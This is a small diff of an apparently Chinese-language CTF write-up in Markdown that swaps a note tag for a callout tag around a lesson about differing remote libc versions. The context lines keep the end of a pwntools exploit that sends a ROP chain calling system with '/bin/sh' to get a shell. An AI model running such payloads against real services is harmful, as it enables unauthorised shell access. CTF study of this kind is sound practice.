@@ -72,8 +72,8 @@ sh.sendline(b'0'*0x18 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(sy
 
 sh.interactive()
 ```
-{% notel green 本题获得的教训 %}
+{% callout green ::本题获得的教训 %}
 由于远端libc的不同，main在stack上的地址也是不一样的
-{% endnotel %}
+{% endcallout %}
 
 Done.
